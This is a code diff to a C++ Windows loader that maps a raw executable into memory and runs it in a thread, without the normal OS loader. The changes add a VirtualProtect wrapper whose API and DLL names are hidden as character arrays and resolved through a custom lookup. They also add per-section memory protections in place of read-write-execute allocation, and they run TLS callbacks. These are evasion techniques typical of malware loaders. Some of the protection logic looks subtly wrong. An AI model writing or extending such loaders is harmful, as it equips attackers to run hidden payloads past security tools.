@@ -223,6 +223,27 @@ void freecustom(void* ptr) {
     // std::cout << "[DEBUG] free completed" << std::endl;
 }
 
+BOOL VirtualProtectCustom(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect) {
+    // std::cout << "[DEBUG] VirtualProtectCustom called with lpAddress: " << lpAddress << std::endl;
+
+    WCHAR kernel32_dll_name[] = { L'k', L'e', L'r', L'n', L'e', L'l', L'3', L'2', L'.', L'd', L'l', L'l', 0 };
+    char virtualprotect_name[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', 0 };
+
+    BOOL(*_VirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD) =
+        (BOOL(*)(LPVOID, SIZE_T, DWORD, PDWORD))get_function_custom(kernel32_dll_name, virtualprotect_name);
+
+    if (!_VirtualProtect) {
+        // std::cout << "[ERROR] Failed to get function VirtualProtect from kernel32.dll" << std::endl;
+        return FALSE;
+    }
+
+    BOOL result = _VirtualProtect(lpAddress, dwSize, flNewProtect, lpflOldProtect);
+    // std::cout << "[DEBUG] VirtualProtect completed with result: " << result << std::endl;
+
+    return result;
+}
+
+
 void* __cdecl malloc_custom(size_t _Size) {
     // Debug output (commented out)
     // std::cout << "[DEBUG] malloc_custom called with _Size: " << _Size << std::endl;
@@ -277,7 +298,7 @@ PVOID GetFixedBaseAddress(PIMAGE_NT_HEADERS64 pNTHeaders) {
     // std::cout << "[DEBUG] GetFixedBaseAddress called" << std::endl;
     // std::cout << "[DEBUG] Size of image: " << std::dec << pNTHeaders->OptionalHeader.SizeOfImage << std::endl;
 
-    PVOID baseAddress = VirtualAlloccustom(NULL, pNTHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    PVOID baseAddress = VirtualAlloccustom(NULL, pNTHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!baseAddress) {
         // std::cout << "[ERROR] Failed to allocate memory for image" << std::endl;
     }
@@ -305,7 +326,7 @@ void WriteSections(PVOID baseAddress, PVOID raw_pe, PIMAGE_DOS_HEADER pDOSHeader
         // std::cout << "  Raw offset: " << std::dec << pSectionHeader->PointerToRawData << std::endl;
         // std::cout << "  Size of raw data: " << std::dec << pSectionHeader->SizeOfRawData << std::endl;
         // std::cout << "  Virtual Size: " << std::dec << pSectionHeader->Misc.VirtualSize << std::endl;
-
+        DWORD protection = 0;
         if (pSectionHeader->SizeOfRawData > 0) {
             LPVOID dest = (LPBYTE)baseAddress + pSectionHeader->VirtualAddress;
             LPVOID src = (LPBYTE)raw_pe + pSectionHeader->PointerToRawData;
@@ -316,6 +337,7 @@ void WriteSections(PVOID baseAddress, PVOID raw_pe, PIMAGE_DOS_HEADER pDOSHeader
     }
     // std::cout << "[DEBUG] Sections written" << std::endl;
 }
+
 
 BOOL FixImports(PIMAGE_NT_HEADERS64 pNTHeaders, PVOID baseAddress) {
     // std::cout << "[DEBUG] FixImports called" << std::endl;
@@ -440,6 +462,63 @@ void BaseRelocation(PVOID baseAddress, PIMAGE_NT_HEADERS64 pNTHeaders) {
     // std::cout << "[DEBUG] Base relocation completed" << std::endl;
 }
 
+BOOL runTlsCallback(PVOID baseAddress, PIMAGE_NT_HEADERS64 pNtHeaders) {
+    const DWORD TlsEntryVirtualAddress = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress;
+    if (TlsEntryVirtualAddress == 0) {
+        return TRUE;
+    }
+    const PIMAGE_TLS_DIRECTORY lpImageTLSDirectory = (PIMAGE_TLS_DIRECTORY)((LPBYTE)baseAddress + TlsEntryVirtualAddress);
+    PIMAGE_TLS_CALLBACK* lpCallbackArray = (PIMAGE_TLS_CALLBACK*)lpImageTLSDirectory->AddressOfCallBacks;
+
+    while (*lpCallbackArray != NULL) {
+        const PIMAGE_TLS_CALLBACK lpImageCallback = *lpCallbackArray;
+        lpImageCallback(baseAddress, DLL_PROCESS_ATTACH, NULL);
+        lpCallbackArray++;
+    }
+    return TRUE;
+}
+
+
+BOOL fixPermissions(PVOID baseAddress, PIMAGE_DOS_HEADER pDOSHeader, PIMAGE_NT_HEADERS64 pNTHeaders) {
+    // std::cout << "[DEBUG] WriteSections called" << std::endl;
+
+    PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)pNTHeaders + sizeof(IMAGE_NT_HEADERS64));
+    for (int i = 0; i < pNTHeaders->FileHeader.NumberOfSections; i++) {
+        if (pSectionHeader->SizeOfRawData > 0) {
+            DWORD protection = 0;
+            DWORD old;
+            LPVOID dest = (LPBYTE)baseAddress + pSectionHeader->VirtualAddress;
+
+            if (pSectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE) {
+                protection = PAGE_WRITECOPY;
+            }
+            if (pSectionHeader->Characteristics & IMAGE_SCN_MEM_READ) {
+                protection = PAGE_READONLY;
+            }
+            if (pSectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE && pSectionHeader->Characteristics & IMAGE_SCN_MEM_READ) {
+                protection = PAGE_READWRITE;
+            }
+            if (pSectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
+                protection = PAGE_READONLY;
+            }
+            if (pSectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE && pSectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE) {
+                protection = PAGE_EXECUTE_WRITECOPY;
+            }
+            if (pSectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE && pSectionHeader->Characteristics & IMAGE_SCN_MEM_READ) {
+                protection = PAGE_EXECUTE_READ;
+            }
+            if ((pSectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pSectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE) && (pSectionHeader->Characteristics & IMAGE_SCN_MEM_READ)) {
+                protection = PAGE_EXECUTE_READWRITE;
+            }
+            if (!VirtualProtectCustom(dest, pSectionHeader->SizeOfRawData, protection, &old)) {
+                return FALSE;
+            }
+        }
+        pSectionHeader++;
+    }
+    return TRUE;
+}
+
 BOOL LoadAndExecute(char* raw_pe) {
     // std::cout << "[DEBUG] LoadAndExecute called" << std::endl;
 
@@ -460,7 +539,6 @@ BOOL LoadAndExecute(char* raw_pe) {
     PVOID baseAddress = GetFixedBaseAddress(pNTHeaders);
     if (!baseAddress) {
         // std::cout << "[ERROR] Unable to allocate base address" << std::endl;
-        freecustom(raw_pe);
         return FALSE;
     }
 
@@ -469,12 +547,23 @@ BOOL LoadAndExecute(char* raw_pe) {
 
     if (!FixImports(pNTHeaders, baseAddress)) {
         // std::cout << "[ERROR] Failed to fix imports" << std::endl;
-        freecustom(raw_pe);
         VirtualFreecustom(baseAddress, 0, MEM_RELEASE);
         return FALSE;
     }
 
     BaseRelocation(baseAddress, pNTHeaders);
+    if (!fixPermissions(baseAddress, pDOSHeader, pNTHeaders)) {
+        // std::cout << "[ERROR] Failed to fix Permissions" << GetLastError() << std::endl;
+        VirtualFreecustom(baseAddress, 0, MEM_RELEASE);
+        return FALSE;
+    }
+
+
+    if (!runTlsCallback(baseAddress, pNTHeaders)) {
+        // std::cout << "[ERROR] Failed to runTlsCallback" << GetLastError() << std::endl;
+        VirtualFreecustom(baseAddress, 0, MEM_RELEASE);
+        return FALSE;
+    }
 
     LPTHREAD_START_ROUTINE entryPoint = (LPTHREAD_START_ROUTINE)((LPBYTE)baseAddress + pNTHeaders->OptionalHeader.AddressOfEntryPoint);
     // std::cout << "[DEBUG] Creating thread at entry point: " << entryPoint << std::endl;
@@ -491,7 +580,6 @@ BOOL LoadAndExecute(char* raw_pe) {
 
     if (!threadHandle) {
         // std::cout << "[ERROR] Error occurred during thread creation" << std::endl;
-        freecustom(raw_pe);
         VirtualFreecustom(baseAddress, 0, MEM_RELEASE);
         return FALSE;
     }
@@ -501,7 +589,6 @@ BOOL LoadAndExecute(char* raw_pe) {
     WaitForSingleObjectcustom(threadHandle, INFINITE);
     CloseHandlecustom(threadHandle);
 
-    freecustom(raw_pe);
     VirtualFreecustom(baseAddress, 0, MEM_RELEASE);
 
     // std::cout << "[DEBUG] LoadAndExecute completed successfully" << std::endl;
